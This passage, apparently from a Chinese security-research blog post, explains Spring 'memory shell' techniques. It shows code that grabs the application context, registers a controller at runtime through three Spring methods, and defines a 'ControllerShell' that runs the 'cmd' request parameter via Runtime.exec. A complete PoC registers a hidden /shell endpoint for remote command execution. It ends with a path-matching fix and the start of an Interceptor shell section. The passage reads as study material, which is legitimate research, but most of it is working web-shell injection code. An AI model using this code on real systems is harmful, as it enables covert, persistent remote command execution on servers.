+<h5 id="RequestContextUtils"><a href="#RequestContextUtils" class="headerlink" title="RequestContextUtils"></a><strong>RequestContextUtils</strong></h5><p>通过 <code>ServletRequest</code> 类的实例来获得 <code>Child WebApplicationContext</code>。  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a><strong>getAttribute</strong></h5><p> 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="反射获取"><a href="#反射获取" class="headerlink" title="反射获取"></a>反射获取</h5><p> 还可以通过反射获取<code>LiveBeansView</code>类的<code>applicationContexts</code> 属性来获取上下文。  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. 属性被 private 修饰，所以 setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. 获取一个 ApplicationContext 实例</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure>
+
+<p><code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。  </p>
+<h4 id="1-3-2-注册-Controller"><a href="#1-3-2-注册-Controller" class="headerlink" title="1.3.2 注册 Controller"></a>1.3.2 注册 Controller</h4><p>Spring Controller 的动态注册，就是对 <code>RequestMappingHandlerMapping</code> 注入的过程。</p>
+<p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br><code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>映射器 ；</p>
+<p>Spring 3.1 开始及以后一般开始使用新的<br><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>映射器来支持@Contoller和@RequestMapping注解。</p>
+<p>三种方法：</p>
+<ol>
+<li>registerMapping</li>
+<li>registerHandler</li>
+<li>detectHandlerMethods</li>
+</ol>
+<h5 id="registerMapping"><a href="#registerMapping" class="headerlink" title="registerMapping"></a>registerMapping</h5><p> 在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br><span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/hahaha&quot;</span>);<br><span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>r.registerMapping(info, Class.forName(<span class="hljs-string">&quot;恶意Controller&quot;</span>).newInstance(), method);<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="registerHandler"><a href="#registerHandler" class="headerlink" title="registerHandler"></a>registerHandler</h5><p>参考上面的 <code>HandlerMapping</code> 接口继承关系图，针对使用 <code>DefaultAnnotationHandlerMapping</code> 映射器的应用，可以找到它继承的顶层类<code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code></p>
+<p>在其<code>registerHandler()</code>方法中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518808.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 该方法接受 <code>urlPath</code>参数和 <code>handler</code>参数，可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 将 url 和 controller 实例 bean 注册到 <code>handlerMap</code> 中  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><br>context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).newInstance());<br><span class="hljs-comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span><br>org.springframework.web.servlet.mvc.annotation.<span class="hljs-type">DefaultAnnotationHandlerMapping</span>  <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);<br><span class="hljs-comment">// 3. 反射获得 registerHandler Method</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;registerHandler&quot;</span>, String.class, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span><br>m1.invoke(dh, <span class="hljs-string">&quot;/favicon&quot;</span>, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="detectHandlerMethods"><a href="#detectHandlerMethods" class="headerlink" title="detectHandlerMethods"></a>detectHandlerMethods</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518516.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 该方法仅接受<code>handler</code>参数，同样可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 并注册 <code>controller</code> 的实例 <code>bean</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;恶意Controller&quot;</span>).newInstance());<br>org.springframework.web.servlet.mvc.method.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;detectHandlerMethods&quot;</span>, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br>m1.invoke(requestMappingHandlerMapping, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="1-3-3-实现恶意-Controller"><a href="#1-3-3-实现恶意-Controller" class="headerlink" title="1.3.3 实现恶意 Controller"></a>1.3.3 实现恶意 Controller</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ControllerShell</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="1-3-4-完整-POC"><a href="#1-3-4-完整-POC" class="headerlink" title="1.3.4 完整 POC"></a>1.3.4 完整 POC</h4><p>POC 并不唯一，想要复现成功取决于自己的<strong>运行环境</strong>，比如 spring boot 版本问题等，<strong>具体问题具体分析！</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_controller</span> &#123;<br><br>    <span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;<br><br>        <span class="hljs-comment">//获取当前上下文环境</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">//手动注册Controller</span><br>        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>);<br>        <span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>            <span class="hljs-comment">//获取request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>先访问 &#x2F;control 进行 controller 注册，然后访问 controller 映射路径 &#x2F;shell，加上参数就可以实现 RCE</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518492.png" srcset="/img/loading.gif" lazyload alt="img">	<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518947.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="记录问题："><a href="#记录问题：" class="headerlink" title="记录问题："></a>记录问题：</h4><p>环境：</p>
+<p>Spring Boot    v2.6.13</p>
+<p>Spring Framework v5.3.23</p>
+<p>Tomcat 9.0.68</p>
+<p>JDK 1.8.0_65</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518183.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> <strong>- 核心错误：</strong>（借用 AI 解决）</p>
+<p><strong>java.lang.IllegalArgumentException: Expected lookupPath in request attribute “org.springframework.web.util.UrlPathHelper.PATH”.</strong></p>
+<p>​	at org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.3.23.jar:5.3.23]</p>
+<p>​	at org.springframework.web.util.UrlPathHelper.getResolvedLookupPath(UrlPathHelper.java:213) ~[spring-web-5.3.23.jar:5.3.23]</p>
+<p>Spring MVC 在匹配请求路径时，从 <code>request</code> 中没有找到名为 <code>&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</code> 的属性。</p>
+<p>这是 <strong>Spring 5.3.x</strong> 与 <strong>Tomcat 9 &#x2F; Servlet 4</strong> 之间在请求路径解析机制上的一个兼容性问题。</p>
+<p><strong>出现原因：</strong></p>
+<h3 id="Spring-Boot-版本问题"><a href="#Spring-Boot-版本问题" class="headerlink" title="Spring Boot 版本问题"></a>Spring Boot 版本问题</h3><p>使用的是：</p>
+<p>Spring Boot 2.6.13</p>
+<p>Spring Framework 5.3.23</p>
+<p>Tomcat 9.0.68</p>
+<p>这一代中，Spring MVC 的路径解析默认切换到了 <strong>PathPatternParser</strong>，而部分组件仍然依赖旧的 <code>UrlPathHelper</code>。</p>
+<p>如果你项目中混用了旧式的 <code>@RequestMappingHandlerMapping</code> 或自定义 <code>HandlerMapping</code>，也可能触发这个问题。</p>
+<h3 id="Spring-配置不兼容（可能加了某些配置类）"><a href="#Spring-配置不兼容（可能加了某些配置类）" class="headerlink" title="Spring 配置不兼容（可能加了某些配置类）"></a>Spring 配置不兼容（可能加了某些配置类）</h3><p>从 Spring Boot 2.6 开始：</p>
+<ul>
+<li>默认路径匹配策略从 <code>AntPathMatcher</code> 改成了 <code>PathPatternParser</code>；</li>
+<li>某些旧代码（或自定义 Controller 注册逻辑）没适配这个新规则。</li>
+</ul>
+<p><strong>解决方法：</strong></p>
+<p>在 <code>application.properties</code> 或 <code>application.yml</code> 加上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">spring.mvc.pathmatch.matching-strategy=ant_path_matcher<br></code></pre></td></tr></table></figure>
+
+<p>意思：强制使用旧版的路径解析机制（与 Spring 2.5 以前版本兼容）。</p>
+<p>适用于目前使用的 Spring Boot 2.6.x。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520466.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518085.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="2、Interceptor-内存马"><a href="#2、Interceptor-内存马" class="headerlink" title="2、Interceptor 内存马"></a>2、Interceptor 内存马</h2><h3 id="什么是Interceptor"><a href="#什么是Interceptor" class="headerlink" title="什么是Interceptor"></a>什么是Interceptor</h3><p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。</p>
+<p>在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p>
+<ul>
+<li>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</li>
+<li>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</li>
+</ul>
+<p><strong>Interceptor和Tomcat和Filter过滤器很类似。</strong></p>
+<p>区别如下：</p>
+<ol>
+<li>Interceptor基于反射，Filter基于函数回调</li>
+<li>Interceptor不依赖servlet容器</li>
+<li>Interceptor只能对action请求有用</li>
+<li>Interceptor可以访问action上下文，栈里的对象。Filter不能</li>
+<li>action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次</li>
+<li>Interceptor可以获取IOC容器中的bean，Filter不行</li>
+</ol>
+<p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作</p>
+<h3 id="2-1-Interceptor-创建"><a href="#2-1-Interceptor-创建" class="headerlink" title="2.1 Interceptor 创建"></a>2.1 Interceptor 创建</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.interceptor;<br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> String.valueOf(request.getRequestURL());<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br><br>        <span class="hljs-keyword">if</span>(url.indexOf(<span class="hljs-string">&quot;/login&quot;</span>)&gt;= <span class="hljs-number">0</span> )&#123;<br>            writer.write(<span class="hljs-string">&quot;LoginIn&quot;</span>);<br>            writer.flush();<br>            writer.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        writer.write(<span class="hljs-string">&quot;LoginInFirst&quot;</span>);<br>        writer.flush();<br>        writer.close();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Page&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/data&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">data</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Protected Data&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.config;<br><br><span class="hljs-keyword">import</span> com.src.springmem.demos.interceptor.LoginInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginInterceptor</span>())<br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)           <span class="hljs-comment">// 拦截所有路径</span><br>                .excludePathPatterns(<span class="hljs-string">&quot;/login&quot;</span>);   <span class="hljs-comment">// 放行登录接口</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520006.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>访问可通行的路径：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518686.png" srcset="/img/loading.gif" lazyload alt="img">	<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518278.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="2-2-Interceptor-流程分析"><a href="#2-2-Interceptor-流程分析" class="headerlink" title="2.2 Interceptor 流程分析"></a>2.2 Interceptor 流程分析</h3><p>还是在 DispatcherServlet.doDispatch 处下断点调试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518820.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>步入 getHandler()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521460.png" srcset="/img/loading.gif" lazyload alt="img"></p>
